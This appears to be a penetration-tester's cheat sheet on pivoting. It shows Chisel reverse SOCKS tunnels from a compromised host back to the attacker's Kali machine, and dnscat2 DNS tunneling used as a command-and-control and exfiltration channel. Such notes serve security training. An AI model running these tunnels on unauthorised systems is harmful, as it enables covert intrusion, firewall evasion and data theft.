# Chisel

[Chisel](https://github.com/jpillora/chisel) is an HTTP tunnel that forwards all the network connection through the HTTP protocol. It can be used combined with SSH to provide a good way to bypass firewalls that allows only Web traffic. Chisel uses a client/server model and binds the connection to the SOCKS port on the kali machine.

First we start chisel `SERVER` executable. It can happen that the target doesn't have the chisel executable. In this case we must provide it first.

```shell
chisel server --port <LOCAL-PORT> --reverse
```

On the `CLIENT` we must bind the connection with the server. The R specifies SOCKS reverse tunneling that bounds on port 1080 on the kali machine by default (`ss -ntplu` to check the bind status)

```shell
/tmp/chisel client <KALI-IP>:<LOCAL-PORT> R:socks > /dev/null 2>&1 &
```

Now, on the server we can navigate through the chisel tunnel with HTTP connection. We specify the ProxyCommand option that is the SSH option to specify a SOCKS5 connection and we use ncat, a modified version of netcat that accepts a SOCKS5 connection.

```shell
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' user@<REMOTE-IP>
```

Alternately we can use proxychains bound on `127.0.0.1` on port `1080`. This is an example with smbclient.

```shell
proxychains smbclient -L \\<REMOTE-IP>
```

# DNS Tunneling

DNS tunneling takes advantage of this fact by using DNS requests to implement a command and control channel for malware. Inbound DNS traffic can carry commands to the malware, while outbound traffic can exfiltrate sensitive data or provide responses to the malware operator’s requests. This works because DNS is a very flexible protocol. There are very few restrictions on the data that a DNS request contains because it is designed to look for domain names of websites. Since almost anything can be a domain name, these fields can be used to carry sensitive information. These requests are designed to go to attacker-controlled DNS servers, ensuring that they can receive the requests and respond in the corresponding DNS replies.

## DNSCAT2

With [dnscat](https://github.com/iagox86/dnscat2) we can use DNS as a tunnel and forward all traffic with DNS requests from one host, to connect a WAN host to an host deep and protected in the internal LAN. The **WAN-HOST** will query the **IP-B** through the DNS tunnel that **IP-A** establish with **WAN-HOST**, using **IP-C** as a resolver.

```
                DNS ------IP-C
                 |     
WAN-HOST ----- IP-A ------IP-B
   |____________||__________|

```

On the internal host, after we gain access to it, we run

```shell
./dnscat <DOMAIN>
```

And on the host in the WAN we run

```shell
dnscat2-server <DOMAIN>
```

Where the **DOMAIN** is a domain that can be resolved in the LAN. Now on the server we can interact with the tunnel created

```shell
window -i 1
```

And run the command that forwards the **LOCAL-PORT** to the **REMOTE-INTERNAL-IP** using the **REMOTE-PORT**

```shell
listen 127.0.0.1:<LOCAL-PORT> <REMOTE-INTERNAL-IP>:<REMOTE-PORT>
```

Now on the WAN host we can query the **REMOTE-INTERNAL-IP** using the tunnel, with a connection that points to **LOCAL-PORT**

```shell
ssh user@127.0.0.1 -p <LOCAL-PORT>
```